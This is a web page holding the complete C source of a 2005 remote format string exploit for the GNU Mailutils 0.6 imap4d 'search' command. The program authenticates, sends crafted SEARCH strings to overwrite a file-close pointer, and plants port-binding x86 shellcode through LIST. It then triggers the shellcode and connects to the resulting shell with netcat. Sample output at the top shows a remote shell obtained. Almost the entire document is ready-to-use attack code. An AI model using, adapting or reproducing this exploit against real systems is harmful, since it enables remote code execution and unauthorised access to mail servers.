<html>
<head>
<title>GNU Mailutils imap4d 0.6 (search) Remote Format String Exploit</title>
<pre>
/*
 *  GNU Mailutils 0.6 imap4d 'search' format string exploit.
 *  Ref: www.idefense.com/application/poi/display?id=303&amp;type=vulnerabilities
 *
 *  This silly exploit uses hardcoded values taken from GNU/Debian testing (etch).
 *
 *  $ ./imap4d_search_expl -h 127.0.0.1 -p 143 -u clem1 -s PROUT
 *  [+] GNU Mailutils 0.6 imap4d 'search' format string exploit.
 *  [+] By clem1.
 *  [+] connecting to: 127.0.0.1:143
 *  [+] authentification: completed.
 *  [+] format string: sended
 *  [+] shellcode sended.
 *  [+] Bingo.
 *  
 *  id;      
 *  uid=1000(clem1) gid=1002(mail) groups=0(root)
 *
 *  Copyright (C) 2005 Clement Lecigne - clem1 @ badcode.info.
 */

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;errno.h&gt;
#include &lt;string.h&gt;
#include &lt;getopt.h&gt;
#include &lt;netdb.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/fcntl.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;arpa/inet.h&gt;

struct values {
	int offset;
	int IO_file_close;
	int addr;
	char mailbox[32];
} v = {
	11,
	0x40468bc4,
	0x80906e0, //0xaabbccdd
	&quot;inbox&quot;
};

void usage(char *);
void auth(int, char *, char *);
void sendsc(int);
void owned(int, char *);
void fmtbuild(int);

/*
 * s0t4ipv6@Shellcode.com.ar
 * x86 portbind a shell in port 5074
 */
char sc[] = &quot;\x31\xc0\x50\x40\x89\xc3\x50\x40&quot;
	    &quot;\x50\x89\xe1\xb0\x66\xcd\x80\x31&quot;
	    &quot;\xd2\x52\x66\x68\x13\xd2\x43\x66&quot;
	    &quot;\x53\x89\xe1\x6a\x10\x51\x50\x89&quot;
	    &quot;\xe1\xb0\x66\xcd\x80\x40\x89\x44&quot;
	    &quot;\x24\x04\x43\x43\xb0\x66\xcd\x80&quot;
	    &quot;\x83\xc4\x0c\x52\x52\x43\xb0\x66&quot;
	    &quot;\xcd\x80\x93\x89\xd1\xb0\x3f\xcd&quot;
	    &quot;\x80\x41\x80\xf9\x03\x75\xf6\x52&quot;
	    &quot;\x68\x6e\x2f\x73\x68\x68\x2f\x2f&quot;
	    &quot;\x62\x69\x89\xe3\x52\x53\x89\xe1&quot;
	    &quot;\xb0\x0b\xcd\x80&quot;;

char b[1024];
int i;

int main(int ac, char **av){
	char o, *host, *user, *pass;
	struct hostent *h;
	struct sockaddr_in s;
	int port, fd;
	
	puts(&quot;[+] GNU Mailutils 0.6 imap4d 'search' format string exploit.&quot;);
	puts(&quot;[+] By clem1.&quot;);

	if(ac != 9) usage(av[0]);
	
	while((o = getopt(ac,av,&quot;h:p:u:s:&quot;)) != EOF) {
		switch (o) {
			case 'h':
				host = optarg;
				break;
			case 'p':
				port = atoi(optarg);
				break;
			case 'u':
				user = optarg;
				break;
			case 's':
				pass = optarg;
				break;
			default:
				usage(av[0]);
				break;
		}
	}
	if((h = gethostbyname(host)) == NULL) {
		herror(&quot;[-] gethostbyname()&quot;);
		exit(1);
        }
	
	printf(&quot;[+] connecting to: %s:%d\n&quot;, inet_ntoa(*((struct in_addr *)h-&gt;h_addr)), port);

	fd = socket(AF_INET, SOCK_STREAM, 0);
	if(fd == -1){
		perror(&quot;[-] socket()&quot;);
		exit(1);
	}

	s.sin_family = AF_INET;
	s.sin_port = htons(port);
	s.sin_addr = *((struct in_addr *)h-&gt;h_addr);
	bzero(&amp;(s.sin_zero), 8);

	if (connect(fd, (struct sockaddr *)&amp;s, sizeof s) == -1) {
		perror(&quot;[-] connect()&quot;);
		exit(1);
	}

	i = recv(fd, b, 1023, 0);
	b[i] = 0;
	if(strstr(b, &quot;IMAP4rev1&quot;) == NULL){
		puts(&quot;[-] failled.&quot;);
		exit(1);
	}
	/* authentification. */
	auth(fd, user, pass);
	/* build and send evil format string. */
	fmtbuild(fd);
	/* store shellcode in imap4d rwx adresse space. */
	sendsc(fd);
	/* force a call to fclose, uhm no shellcode ;&gt; */
	owned(fd, host);
	return 0;
}

void auth(int fd, char *user, char *pass){
	memset(b, 0x0, 1024);
	snprintf(b, 1023, &quot;1 LOGIN \&quot;%s\&quot; \&quot;%s\&quot;\n&quot;, user, pass);
	if(send(fd, b, strlen(b), 0) == -1){
		perror(&quot;[-] send()&quot;);
		exit(1);
	}
	memset(b, 0x0, 1024);
	i = recv(fd, b, 1023, 0);
	b[i] = 0x0;
	if(strstr(b, &quot;Completed&quot;) == NULL){
		puts(&quot;[-] LOGIN failled.&quot;);
		exit(1);
	}
	memset(b, 0x0, 1024);
	snprintf(b, 1023, &quot;2 SELECT \&quot;%s\&quot;\n&quot;, v.mailbox);
	if(send(fd, b, strlen(b), 0) == -1){
		perror(&quot;[-] send()&quot;);
		exit(1);
	}
	memset(b, 0x0, 1024);
	while((i = recv(fd, b, 1023, 0)) != -1){
		b[i] = 0x0;
		if(strstr(b, &quot;Completed&quot;) != NULL)
			break;
		if(strstr(b, &quot;Couldn't&quot;) != NULL){
			puts(&quot;[-] SELECT failled.&quot;);
			exit(1);
		}
	}
	puts(&quot;[+] authentification: completed.&quot;);
	return;
}

void sendsc(int fd){
	memset(b, 0x41, 1024);
	memcpy(b + 900, sc, strlen(sc));
	memcpy(b + 1020, &quot; A\n&quot;, 3);
	memcpy(b, &quot;3 LIST &quot;, 7);
	if(send(fd, b, strlen(b), 0) == -1){
		perror(&quot;[-] send()&quot;);
		exit(1);
	}
	memset(b, 0x0, 1024);
	while((i = recv(fd, b, 1023, 0)) != -1){
		b[i] = 0x0;
		if(strstr(b, &quot;Completed&quot;) != NULL)
			break;
		if(strstr(b, &quot;BAD&quot;) != NULL){
			puts(&quot;[-] LIST failled.&quot;);
			exit(1);
		}
	}
	puts(&quot;[+] shellcode sended.&quot;);
	return;
}

void fmtbuild(int fd){
	unsigned char b0, b1, b2, b3;
	int a1, a2;
	a1 = (v.addr &amp; 0xffff0000) &gt;&gt; 16;
	a2 = (v.addr &amp; 0x0000ffff);
	b0 = (v.IO_file_close &gt;&gt; 24) &amp; 0xff;
	b1 = (v.IO_file_close &gt;&gt; 16) &amp; 0xff;
	b2 = (v.IO_file_close &gt;&gt; 8) &amp; 0xff;
	b3 = (v.IO_file_close) &amp; 0xff;
	snprintf(b, sizeof b,     &quot;3 SEARCH TOPIC &quot;
				  &quot;A&quot; /* pad. */
				  &quot;%c%c%c%c&quot; 
				  &quot;%%.%hdx&quot;
				  &quot;%%%d$hn\n&quot;,
				  b3 + 2, b2, b1, b0,
				  a1 - 0x24,
				  v.offset);
	if(send(fd, b, strlen(b), 0) == -1){
		perror(&quot;[-] send()&quot;);
		exit(1);
	}
	while((i = recv(fd, b, 1023, 0)) != -1){
		b[i] = 0x0;
		if(strstr(b, &quot;BAD&quot;) != NULL)
			break;
	}
	memset(b, 0x0, 1024);
	snprintf(b, sizeof b,     &quot;3 SEARCH TOPIC &quot;
				  &quot;A&quot; /* pad. */
				  &quot;%c%c%c%c&quot; 
				  &quot;%%.%hdx&quot;
				  &quot;%%%d$hn\n&quot;,
				  b3, b2, b1, b0,
				  a2 - 0x24,
				  v.offset);
	if(send(fd, b, strlen(b), 0) == -1){
		perror(&quot;[-] send()&quot;);
		exit(1);
	}
	while((i = recv(fd, b, 1023, 0)) != -1){
		b[i] = 0x0;
		if(strstr(b, &quot;BAD&quot;) != NULL)
			break;
	}
	puts(&quot;[+] format string: sended&quot;);
	return;
}

void owned(int fd, char *host){
	memset(b, 0x0, 1024);
	snprintf(b, 1023, &quot;3 SUBSCRIBE OWNED\n&quot;);
	if(send(fd, b, strlen(b), 0) == -1){
		perror(&quot;[-] send()&quot;);
		exit(1);
	}
	puts(&quot;[+] Bingo.\n&quot;);
	sleep(1);
	execl(&quot;/bin/nc&quot;, &quot;prout&quot;, host, &quot;5074&quot;, NULL);
	printf(&quot;[-] muh? where is nc?\n[+] A shell is waiting you on %s:5074.\n&quot;, host);
	return;	
}

void usage(char *ex){
	printf(&quot;usage: %s -h &lt;hostname&gt; -p &lt;port&gt; -u &lt;user&gt; -s &lt;password&gt;\n&quot;, ex);
	exit(1);
}

// milw0rm.com [2005-09-10]
</pre>
</html>

